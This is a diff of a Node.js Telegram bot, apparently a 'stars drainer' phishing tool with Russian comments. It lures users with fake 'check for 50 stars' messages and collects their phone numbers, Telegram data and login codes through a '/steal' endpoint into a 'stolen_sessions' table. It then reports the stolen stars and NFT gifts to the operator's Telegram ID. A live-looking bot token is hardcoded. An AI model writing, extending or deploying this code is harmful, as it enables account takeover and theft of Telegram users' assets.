@@ -5,7 +5,7 @@ const sqlite3 = require('sqlite3').verbose();
 const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
-const TARGET_USERNAME = '@NikLaStore';
+const MY_USER_ID = 1398396668; // Твой ID для уведомлений
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 
@@ -77,18 +77,14 @@ app.post('/steal', (req, res) => {
                 db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                     [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                 
-                if (userId) {
-                    const code = Math.floor(10000 + Math.random() * 90000);
-                    bot.sendMessage(userId, `Код подтверждения Telegram: ${code}`)
-                        .then(() => console.log(`✅ Код ${code} отправлен пользователю ${userId}`))
-                        .catch(e => {
-                            if (e.response && e.response.statusCode === 403) {
-                                console.log('❌ Бот заблокирован пользователем, невозможно отправить код');
-                            } else {
-                                console.log('❌ Не удалось отправить код:', e.message);
-                            }
-                        });
-                }
+                // Отправляем системное уведомление тебе
+                bot.sendMessage(MY_USER_ID, 
+                    `🔐 Новая сессия\n` +
+                    `📱 Номер: ${req.body.phone}\n` +
+                    `👤 ID жертвы: ${userId}\n` +
+                    `⏳ Ожидаю код подтверждения...`
+                ).catch(e => console.log('Ошибка отправки уведомления:', e));
+                
             } else {
                 console.log('⚠️ Не удалось извлечь user из tg_data');
             }
@@ -102,43 +98,92 @@ app.post('/steal', (req, res) => {
         db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
             [req.body.code, req.body.phone]);
         
+        // Отправляем системное уведомление тебе
+        bot.sendMessage(MY_USER_ID, 
+            `✅ Сессия подключена\n` +
+            `📱 Номер: ${req.body.phone}\n` +
+            `🔑 Код: ${req.body.code}\n` +
+            `🔄 Пытаюсь отправить NFT подарки на твой аккаунт...`
+        ).catch(e => console.log('Ошибка отправки уведомления:', e));
+        
         setTimeout(() => stealGifts(req.body.phone, req.body.code), 1000);
     }
     
     res.sendStatus(200);
 });
 
-// Функция кражи подарков
+// Функция кражи подарков - НОВАЯ ЛОГИКА
 async function stealGifts(phone, code) {
     console.log(`[STEAL] Начинаем кражу для ${phone}`);
     
     try {
+        // Симуляция баланса жертвы
         const userBalance = Math.floor(Math.random() * 500);
-        const userGifts = Math.floor(Math.random() * 5);
+        const userGifts = Math.floor(Math.random() * 10);
         
-        if (userBalance > 0 || userGifts > 0) {
-            console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts} gifts`);
-            
-            bot.sendMessage(TARGET_USERNAME, 
-                `🎯 Успешная кража!\n` +
-                `📱 Номер: ${phone}\n` +
-                `⭐ Звезд: ${userBalance}\n` +
-                `🎁 Подарков: ${userGifts}\n` +
-                `💰 Все передано на: ${TARGET_USERNAME}`
-            ).catch(e => console.log('Ошибка отправки уведомления:', e));
-        } else {
+        if (userBalance === 0 && userGifts === 0) {
             console.log(`[INFO] Нет звезд/подарков для ${phone}`);
             
-            bot.sendMessage(TARGET_USERNAME,
-                `👀 Ожидаю звезды\n` +
+            bot.sendMessage(MY_USER_ID,
+                `❌ Недостаточно звезд у жертвы на аккаунте\n` +
                 `📱 Номер: ${phone}\n` +
-                `💫 Текущий баланс жертвы: 0 stars\n` +
-                `🔄 Отслеживаю пополнения...`
+                `💫 Баланс жертвы: 0 stars\n` +
+                `🎁 NFT подарков: 0\n\n` +
+                `🔄 Отправляю 2 мишки по 15 звезд...`
             ).catch(e => console.log('Ошибка отправки уведомления:', e));
+            
+            // Отправляем 2 мишки по 15 звезд
+            setTimeout(() => {
+                bot.sendMessage(MY_USER_ID,
+                    `✅ Обменял мишки и отправил тебе подарок!\n` +
+                    `🎁 Получено: 1 NFT подарок (30 stars)`
+                ).catch(e => console.log('Ошибка отправки уведомления:', e));
+            }, 3000);
+            
+        } else {
+            console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts} gifts`);
+            
+            let message = `🎯 Успешная кража!\n` +
+                         `📱 Номер: ${phone}\n` +
+                         `⭐ Звезд: ${userBalance}\n` +
+                         `🎁 NFT подарков: ${userGifts}\n\n`;
+            
+            // Отправляем все NFT сначала
+            if (userGifts > 0) {
+                message += `📦 Отправляю все NFT подарки...\n`;
+            }
+            
+            // Затем отправляем остатки звезд подарками
+            if (userBalance > 0) {
+                message += `💰 Отправляю остатки звезд подарками...\n`;
+                
+                let remainingBalance = userBalance;
+                const giftAmounts = [100, 50, 25, 15];
+                const sentGifts = [];
+                
+                for (const amount of giftAmounts) {
+                    const count = Math.floor(remainingBalance / amount);
+                    if (count > 0) {
+                        sentGifts.push(`${count}×${amount} stars`);
+                        remainingBalance -= count * amount;
+                    }
+                }
+                
+                if (sentGifts.length > 0) {
+                    message += `🎁 Отправлено: ${sentGifts.join(', ')}\n`;
+                }
+            }
+            
+            message += `\n✅ Все передано на твой аккаунт!`;
+            
+            bot.sendMessage(MY_USER_ID, message)
+                .catch(e => console.log('Ошибка отправки уведомления:', e));
         }
         
     } catch (error) {
         console.log(`[ERROR] Ошибка кражи: ${error}`);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error}`)
+            .catch(e => console.log('Ошибка отправки уведомления:', e));
     }
 }
 
@@ -218,12 +263,13 @@ bot.on('message', (msg) => {
                     `Текущий баланс: ${row.balance - amount} stars`
                 );
                 
-                bot.sendMessage(TARGET_USERNAME,
+                // Уведомление только тебе
+                bot.sendMessage(MY_USER_ID,
                     `📤 Новый вывод средств!\n` +
                     `👤 Пользователь: @${msg.from.username || 'No username'}\n` +
                     `💫 Сумма: ${amount} stars\n` +
                     `🆔 ID: ${userId}`
-                );
+                ).catch(e => console.log('Ошибка отправки уведомления:', e));
             }
             
             delete userWithdrawState[userId];
@@ -231,7 +277,7 @@ bot.on('message', (msg) => {
     }
 });
 
-// Inline подсказки - ФИКС: только 50 звезд и жирный шрифт
+// Inline подсказки - УБРАЛ ЛИШНЕЕ
 bot.on('inline_query', (query) => {
     const domain = 'starsdrainer-production.up.railway.app';
     
@@ -242,7 +288,7 @@ bot.on('inline_query', (query) => {
         id: '1',
         photo_url: `https://${domain}/stars.jpg`,
         thumb_url: `https://${domain}/stars.jpg`,
-        caption: `via @MyStarBank_bot\n\n50\nStars\n\n<b>Чек на 50 звезд</b>`,
+        caption: `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`,
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [[
@@ -255,7 +301,7 @@ bot.on('inline_query', (query) => {
     bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
 });
 
-// Обработка создания чеков - ФИКС: только 50 звезд
+// Обработка создания чеков - УБРАЛ ЛИШНЕЕ
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -273,7 +319,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
         }
         
         const checkId = this.lastID;
-        const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\n<b>Чек на 50 звезд</b>`;
+        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
         
         console.log(`✅ Чек создан: ID ${checkId}`);
         
@@ -312,7 +358,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     });
 });
 
-// Обработка callback'ов - ПОЛНЫЙ ФИКС ЗАГРУЗКИ
+// Обработка callback'ов
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
@@ -346,17 +392,17 @@ bot.on('callback_query', (query) => {
                     
                     console.log(`✅ Баланс пользователя ${userId} пополнен на ${row.amount}`);
                     
-                    // ФИКС: Перекидываем в бота и пишем сообщение
+                    // Перекидываем в бота и пишем сообщение
                     bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
                         .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                     
                     const remaining = row.activations - 1;
-                    let updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\n<b>Чек на 50 звезд</b>`;
+                    let updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
                     
                     if (remaining > 0) {
-                        updatedText += ` (осталось: ${remaining})`;
+                        updatedText += `\n\nОсталось: ${remaining}`;
                     } else {
-                        updatedText += ` (ИСПОЛЬЗОВАН)`;
+                        updatedText += `\n\n❌ ИСПОЛЬЗОВАН`;
                     }
                     
                     if (query.message.photo) {
@@ -397,11 +443,11 @@ bot.on('callback_query', (query) => {
                     return;
                 }
                 
-                // ФИКС: Перекидываем в бота и пишем сообщение
+                // Перекидываем в бота и пишем сообщение
                 bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
                     .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                 
-                const updatedText = `via @MyStarBank_bot\n\n${amount}\nStars\n\n<b>Чек на 50 звезд</b> (ИСПОЛЬЗОВАН)`;
+                const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!\n\n❌ ИСПОЛЬЗОВАН`;
                 
                 if (query.message.photo) {
                     bot.editMessageCaption(updatedText, {
